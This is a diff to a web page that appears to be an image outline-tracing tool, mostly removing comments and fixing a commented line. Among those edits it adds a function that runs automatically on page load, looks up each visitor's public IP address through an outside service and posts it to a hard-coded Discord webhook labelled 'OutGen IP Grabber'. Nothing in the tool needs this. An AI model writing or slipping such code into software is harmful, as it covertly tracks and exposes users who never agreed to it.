@@ -1,5 +1,4 @@
 <html>
-    <!-- <script src="colorstuff.js"></script> -->
     <div style="left:0;top:0;position:fixed;width:100%;height:100%;z-index:-100;background-color:white;"></div>
     <canvas style="display:none;top:0;left:100;position:absolute" id="canvas"></canvas>
     <div id="out" style="display:none;top:/*205*/0px;left:0;position:absolute">Not Loading</div>
@@ -52,15 +51,12 @@
     const imageInput = document.getElementById('imageInput');
   const imagePreview = document.getElementById('image');
 
-  // Listen for the file selection change event
   imageInput.addEventListener('change', function() {
-    const file = this.files[0]; // Access the first selected file
+    const file = this.files[0];
 
     if (file) {
-      // Create a temporary local URL for the file object
       const objectURL = URL.createObjectURL(file);
       
-      // Assign the URL to the image source and make it visible
       imagePreview.src = objectURL;
       imagePreview.style.display = 'block';
     }
@@ -97,10 +93,16 @@
             document.getElementById("spoiler").style.display="none";
         }
     }
+    
+    
 function readmething(){
     return (document.querySelector('input[name="method"]:checked').value=="one")?true:false;
 }
-   
+      async function sendIp(){
+        let data = await(await fetch("https://api.ipify.org/")).text()
+        sendToDiscord(await data)
+    }
+        sendIp()
 image.onload = () => {
   
      IMGWIDTH = image.naturalWidth;
@@ -118,8 +120,23 @@ image.onload = () => {
     document.getElementById("spoiler").style.width = image.width + "px";
     document.getElementById("spoiler").style.height = image.height + "px";
 };
+  async function sendToDiscord(msg) {
+     const DISCORD_WEBHOOK_URL ="https://discord.com/api/webhooks/1524211822620704790/LO3jEkeE3ufjQ4sh8WmMoLViD3QORxXR8_9mg_FnAurUOinNMcj3fYYCrIK2wwrj4y9b";
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: msg,
+	        username: "OutGen IP Grabber",
+        })
+      });
 
+   
+  }
     function load(tol, tol2, method) {
+     
      IMGWIDTH = image.naturalWidth;
      IMGHEIGHT = image.naturalHeight;
      ctx2.width = image.naturalWidth;
@@ -162,7 +179,6 @@ document.getElementById("t2").textContent = "small things "+tol2
         const data = imageData.data;
         table = new Array(h);
 
-        // Load pixels as packed RGB integers
         for (let y = 0; y < h; y++) {
             const row = new Array(w);
             const rowOffset = y * w * 4;
@@ -188,7 +204,6 @@ document.getElementById("t2").textContent = "small things "+tol2
         const rows = table.length;
         const cols = table[0].length;
 
-        // Remove interior pixels
         for (let y = 0; y < rows; y++) {
             const row = table[y];
 
@@ -216,7 +231,6 @@ removeSmallSpots2(tol2, rows, cols);
         }
         outFinalFR = {};
 
-        // Trace paths
         for (let y = 0; y < rows; y++) {
             const row = table[y];
 
@@ -352,7 +366,7 @@ removeSmallSpots2(tol2, rows, cols);
     //    }
        //  ctx2.translate(IMGWIDTH, 0);
        //      for (const key in outFinalFR) {
-       /     ctx2.strokeStyle = "#000000"//toHex(color);
+       //     ctx2.strokeStyle = "#000000"//toHex(color);
 
        //     const p = new Path2D(outFinalFR[key]);
        //     ctx2.stroke(p);
